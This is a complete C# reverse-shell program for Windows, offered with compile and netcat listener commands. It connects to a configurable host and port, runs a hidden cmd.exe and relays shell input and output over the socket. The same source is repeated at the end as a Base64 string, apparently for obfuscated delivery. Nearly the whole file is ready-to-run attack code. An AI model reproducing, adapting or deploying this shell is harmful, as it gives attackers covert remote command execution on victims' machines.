//compile : csc RevSCSWin.cs
//listener : nc -lvnp 25565
//main prog :
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("192.168.1.1", 25565)) // change ip adress and port to your preference
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}

//Base64 encoded : dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5Db21wb25lbnRNb2RlbDsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5OZXQuU29ja2V0czsKCgpuYW1lc3BhY2UgQ29ubmVjdEJhY2sKewoJcHVibGljIGNsYXNzIFByb2dyYW0KCXsKCQlzdGF0aWMgU3RyZWFtV3JpdGVyIHN0cmVhbVdyaXRlcjsKCgkJcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKCQl7CgkJCXVzaW5nKFRjcENsaWVudCBjbGllbnQgPSBuZXcgVGNwQ2xpZW50KCIxOTIuMTY4LjEuMSIsIDI1NTY1KSkKCQkJewoJCQkJdXNpbmcoU3RyZWFtIHN0cmVhbSA9IGNsaWVudC5HZXRTdHJlYW0oKSkKCQkJCXsKCQkJCQl1c2luZyhTdHJlYW1SZWFkZXIgcmRyID0gbmV3IFN0cmVhbVJlYWRlcihzdHJlYW0pKQoJCQkJCXsKCQkJCQkJc3RyZWFtV3JpdGVyID0gbmV3IFN0cmVhbVdyaXRlcihzdHJlYW0pOwoJCQkJCQkKCQkJCQkJU3RyaW5nQnVpbGRlciBzdHJJbnB1dCA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CgoJCQkJCQlQcm9jZXNzIHAgPSBuZXcgUHJvY2VzcygpOwoJCQkJCQlwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICJjbWQuZXhlIjsKCQkJCQkJcC5TdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSB0cnVlOwoJCQkJCQlwLlN0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKCQkJCQkJcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CgkJCQkJCXAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IHRydWU7CgkJCQkJCXAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9IHRydWU7CgkJCQkJCXAuT3V0cHV0RGF0YVJlY2VpdmVkICs9IG5ldyBEYXRhUmVjZWl2ZWRFdmVudEhhbmRsZXIoQ21kT3V0cHV0RGF0YUhhbmRsZXIpOwoJCQkJCQlwLlN0YXJ0KCk7CgkJCQkJCXAuQmVnaW5PdXRwdXRSZWFkTGluZSgpOwoKCQkJCQkJd2hpbGUodHJ1ZSkKCQkJCQkJewoJCQkJCQkJc3RySW5wdXQuQXBwZW5kKHJkci5SZWFkTGluZSgpKTsKCQkJCQkJCS8vc3RySW5wdXQuQXBwZW5kKCJcbiIpOwoJCQkJCQkJcC5TdGFuZGFyZElucHV0LldyaXRlTGluZShzdHJJbnB1dCk7CgkJCQkJCQlzdHJJbnB1dC5SZW1vdmUoMCwgc3RySW5wdXQuTGVuZ3RoKTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCgkJcHJpdmF0ZSBzdGF0aWMgdm9pZCBDbWRPdXRwdXREYXRhSGFuZGxlcihvYmplY3Qgc2VuZGluZ1Byb2Nlc3MsIERhdGFSZWNlaXZlZEV2ZW50QXJncyBvdXRMaW5lKQogICAgICAgIHsKICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzdHJPdXRwdXQgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwoKICAgICAgICAgICAgaWYgKCFTdHJpbmcuSXNOdWxsT3JFbXB0eShvdXRMaW5lLkRhdGEpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBzdHJPdXRwdXQuQXBwZW5kKG91dExpbmUuRGF0YSk7CiAgICAgICAgICAgICAgICAgICAgc3RyZWFtV3JpdGVyLldyaXRlTGluZShzdHJPdXRwdXQpOwogICAgICAgICAgICAgICAgICAgIHN0cmVhbVdyaXRlci5GbHVzaCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKCX0KfQ==